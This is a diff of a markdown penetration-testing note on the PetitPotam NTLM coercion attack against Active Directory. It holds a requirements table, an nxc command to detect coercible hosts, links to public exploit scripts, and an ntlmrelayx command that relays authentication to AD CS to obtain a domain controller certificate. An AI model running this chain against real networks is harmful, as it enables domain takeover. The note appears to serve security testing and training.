@@ -1,9 +1,12 @@
----
-tags:
-  - AD
----
+___
 
-## Attack requirements
+
+
+
+
+## PetitPotam (MS-EFSRPC)
+___
+### Attack requirements
 
 | Feature / Component       | Required for PetitPotam | Required for Full Relay to DA via AD CS |
 | ------------------------- | ----------------------- | --------------------------------------- |
@@ -14,7 +17,7 @@ tags:
 | Vulnerable AD CS Template | ❌ No                    | ✅ Yes                                   |
 | EPA / Channel Binding Off | ❌ No                    | ✅ Yes                                   |
 
-## Identify
+### Identify
 ---
 ```bash
 nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam
@@ -24,11 +27,11 @@ shorthand
 nxc smb <ip> -u '' -p '' -M coerce_plus -o M=pe
 ```
 
-## Exploit
+### Exploit
 ---
 [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)
 [https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1)  
-## Start ntlmrelayx
+### Start ntlmrelayx
 ---
 ```PowerShell
 sudo ntlmrelayx.py -debug -smb2support --target http://CA01.domain.local/certsrv/certfnsh.asp --adcs --template DomainController
